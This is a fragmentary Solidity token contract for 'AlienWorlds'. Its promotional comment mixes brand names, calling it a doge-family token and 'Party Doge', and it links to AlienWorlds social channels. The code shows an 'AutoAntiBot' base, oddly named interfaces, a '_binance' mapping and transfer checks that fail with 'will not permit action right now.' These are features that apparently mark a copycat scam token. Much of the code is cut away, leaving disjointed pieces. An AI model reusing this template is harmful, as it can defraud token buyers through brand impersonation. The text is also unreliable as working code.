...
/**
AlienWorlds is the coolest addition to the doge family with multi dimensional 
...
token with maximum rewards to its holders, Party Doge has it all to lead 
the Doge community.

 * https://AlienWorlds.io/
 * https://twitter.com/AlienWorlds
 * https://t.me/AlienWorlds
*/
pragma solidity 0.8.1;


contract AutoAntiBot {
...
interface IERC20MetaGames is IERC20NFTs {
    /**
 ...
 contract AlienWorlds is AutoAntiBot, IERC20NFTs, IERC20MetaGames {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _binance;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "AlienWorlds.io";
    string private _symbol = "ALIENWORLDS";
    uint256 private constant MAX = ~uint256(0);
//  https://www.coingecko.com/en/coins/AlienWorlds.io
...
function _reflectFee(uint256 rFee, uint256 tFee) private {
    ...
    function transferFrom(
        ...
        require(currentAllowance >= amount, "IERC20NFTs: will not permit action right now.");
        unchecked {
     ...
     * problems described in {IERC20NFTs-approve}.
     *
    ...
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        ...
        require(currentAllowance >= subtractedValue, "IERC20NFTs: will not permit action right now.");
        unchecked {
